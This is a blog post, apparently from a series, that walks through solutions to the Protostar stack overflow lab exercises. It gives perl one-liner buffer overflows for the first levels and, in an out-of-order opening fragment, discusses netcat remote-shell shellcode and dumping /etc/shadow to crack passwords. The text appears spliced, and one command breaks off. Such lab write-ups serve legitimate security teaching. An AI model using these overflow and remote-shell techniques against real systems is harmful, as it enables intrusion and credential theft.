<p>The shell opens, but it exits immediately. The shellcode is executing, but there’s another issue: as documented <a href="http://stackoverflow.com/questions/10767070/buffer-overflow-program-terminates-after-spawning-a-shell">here</a> and <a href="http://forums.freebsd.org/showthread.php?t=10054">here</a>, opening shells from stdin is problematic.</p>

<h4 id="opening-a-shell-through-netcat">Opening a shell through netcat</h4>
<p>We know that our shellcode does run, but it can’t open a shell. However, there are a wide a wide array of exploits available besides running <code>/bin/sh</code>. We could dump <a href="http://en.wikipedia.org/wiki//etc/shadow">/etc/shadow/</a> and use <a href="http://www.openwall.com/john/">John the Ripper</a> to crack the passwords. Another option is to open up a remote shell through <a href="http://linux.die.net/man/1/nc">netcat</a>. We’ll use the netcat solution.</p>

<p>Using <a href="http://shell-storm.org/shellcode/files/shellcode-684.php">netcat shellcode</a>, we go through the same process <a href="https://gist.github.com/9e403a2889a07eeb84a9">(plaintext gist)</a>:</p>

<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>

<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>

<h1 id="solutions">Solutions</h1>
<p>## Stack: Level 0
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> perl -e <span class="s2">&quot;print &#39;a&#39;x65&quot;</span> <span class="p">|</span> ./stack0
<span class="go">you have changed the &#39;modified&#39; variable</span></code></pre></div>

<h2 id="stack-level-1">Stack: Level 1</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./stack1 <span class="k">$(</span>perl -e <span class="s2">&quot;print &#39;a&#39;x64 . dcba&quot;</span><span class="k">)</span>
